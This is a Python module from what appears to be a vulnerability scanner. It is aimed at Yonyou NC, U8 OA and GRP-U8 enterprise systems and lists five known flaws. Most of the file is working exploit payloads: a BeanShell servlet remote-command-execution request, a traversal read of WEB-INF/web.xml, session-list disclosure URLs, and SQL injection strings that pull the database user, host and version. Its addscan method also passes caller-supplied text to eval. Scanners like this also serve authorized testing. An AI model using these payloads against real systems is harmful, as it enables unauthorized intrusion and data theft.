#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    Yonyou扫描类: 
        1. 用友NC BeanShell远程命令执行漏洞
            CNVD-2021-30167

        2. 用友ERP-NC NCFindWeb接口任意文件读取/下载/目录遍历
            暂无编号

        3. 用友U8 OA getSessionList.jsp 敏感信息泄漏
            暂无编号
                Payload: https://blog.csdn.net/qq_41617034/article/details/124268004

        4. 用友U8 OA test.jsp SQL注入
            暂无编号
                Payload: https://blog.csdn.net/qq_41617034/article/details/124268004

        5. 用友GRP-U8 Proxy SQL注入 
            CNNVD-201610-923
                Payload: https://blog.csdn.net/qq_41617034/article/details/124268004


'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from payloads.Yonyou.cnnvd_201610_923 import cnnvd_201610_923_scan
from payloads.Yonyou.cnvd_2021_30167 import cnvd_2021_30167_scan
from payloads.Yonyou.nc_fileread import nc_fileRead_scan
from payloads.Yonyou.u8_oa_getsession import u8_oa_getsession_scan
from payloads.Yonyou.u8_oa_test_sqlinject import u8_oa_test_sqlinject_scan

class Yonyou():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Yonyou'

        self.random_num_1, self.random_num_2 = random_int_2()

        self.cnvd_2021_30167_payloads = [
            {
                'path': 'servlet/~ic/bsh.servlet.BshServlet',
                'data': 'bsh.script=print%28{}*{}%29%3B'.format(self.random_num_1, self.random_num_2)
            }
        ]

        self.yonyou_nc_fileRead_payloads = [
            {
                'path': 'NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml',
                'data': ''
            }
        ]

        self.yonyou_u8_oa_getsession_payloads = [
            {
                'path': 'yyoa/ext/https/getSessionList.jsp?cmd=getAll',
                'data': ''
            },
            {
                'path': 'getSessionList.jsp?cmd=getAll',
                'data': ''
            }
        ]

        self.yonyou_u8_oa_test_sqlinject_payloads = [
            {
                'path': 'yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))',
                'data': ''
            },
            {
                'path': 'test.jsp?doType=101&S1=(SELECT%20MD5(1))',
                'data': ''
            }
        ]

        self.cnnvd_201610_923_payloads = [
            {
                'path': 'Proxy',
                'data': 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>'
            },
            {
                'path': 'Proxy',
                'data': 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
            }
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnnvd_201610_923_scan, url=url),
            thread(target=self.cnvd_2021_30167_scan, url=url),
            thread(target=self.yonyou_nc_fileRead_scan, url=url),
            thread(target=self.yonyou_u8_oa_getsession_scan, url=url),
            thread(target=self.yonyou_u8_oa_test_sqlinject_scan, url=url),
        ]

Yonyou.cnnvd_201610_923_scan = cnnvd_201610_923_scan
Yonyou.cnvd_2021_30167_scan = cnvd_2021_30167_scan
Yonyou.yonyou_nc_fileRead_scan = nc_fileRead_scan
Yonyou.yonyou_u8_oa_getsession_scan = u8_oa_getsession_scan
Yonyou.yonyou_u8_oa_test_sqlinject_scan = u8_oa_test_sqlinject_scan

yonyou = Yonyou()